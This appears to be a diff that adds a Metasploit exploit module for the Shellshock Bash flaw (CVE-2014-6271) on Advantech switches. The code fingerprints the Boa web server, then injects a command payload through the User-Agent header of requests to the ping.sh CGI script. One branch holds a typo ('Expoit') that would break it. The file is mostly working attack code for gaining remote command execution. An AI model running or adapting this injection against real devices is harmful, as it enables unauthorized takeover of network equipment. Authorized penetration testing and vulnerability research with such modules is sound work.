@@ -1,0 +1,101 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit4 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'Advantech Switch Bash Environment Variable Code Injection (Shellshock)',
+      'Description' => %q{
+        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell
+        handles external environment variables. This module targets the 'ping.sh' CGI
+        script, acessible through the Boa web server on Advantech switches. This module
+        was tested against firmware version 1322_D1.98.
+      },
+      'Author' => 'hdm',
+      'References' => [
+        ['CVE', '2014-6271'],
+        ['CWE', '94'],
+        ['OSVDB', '112004'],
+        ['EDB', '34765'],
+        ['URL', 'https://community.rapid7.com/community/infosec/blog/2015/12/01/r7-2015-25-advantech-eki-multiple-known-vulnerabilities'],
+        ['URL', 'https://access.redhat.com/articles/1200223'],
+        ['URL', 'http://seclists.org/oss-sec/2014/q3/649']
+      ],
+      'Privileged' => false,
+      'Arch' => ARCH_CMD,
+      'Platform' => 'unix',
+      'Payload' =>
+        {
+          'Space' => 1024,
+          'BadChars' => "\x00\x0A\x0D",
+          'DisableNops' => true,
+          'Compat' =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'openssl generic'
+            }
+        },
+      'Targets' =>  [[ 'Automatic Targeting', { 'auto' => true } ]],
+      'DefaultTarget' => 0,
+      'License' => MSF_LICENSE,
+      'DisclosureDate' => 'Dec 01 2015'
+    ))
+    register_options([
+      Opt::RPORT(80)
+    ], self.class)
+  end
+
+  #
+  # CVE-2014-6271
+  #
+  def cve_2014_6271(cmd)
+    %{() { :;}; $(#{cmd}) & }
+  end
+
+  #
+  # Check credentials
+  #
+  def check
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => '/cgi-bin/ping.sh'
+    )
+    if !res
+      vprint_error("#{peer} - No response from host")
+      return Exploit::CheckCode::Unknown
+    elsif res.headers['Server'] =~ /Boa\/(.*)/
+      vprint_status("#{peer} - Found Boa version #{$1}")
+    else
+      print_status("#{peer} - Target is not a Boa web server")
+      return Exploit::CheckCode::Safe
+    end
+
+    if res.body.to_s.index('127.0.0.1 ping statistics')
+      return  Exploit::CheckCode::Detected
+    else
+      vprint_error("#{peer} - Target does not appear to be an Advantech switch")
+      return Expoit::CheckCode::Safe
+    end
+  end
+
+  #
+  # Exploit
+  #
+  def exploit
+    cmd = cve_2014_6271(payload.encoded)
+    vprint_status("#{peer} - Trying to run command '#{cmd}'")
+    res = send_request_cgi(
+      'method' => 'GET',
+      'uri'    => '/cgi-bin/ping.sh',
+      'agent'  => cmd
+    )
+  end
+
+end
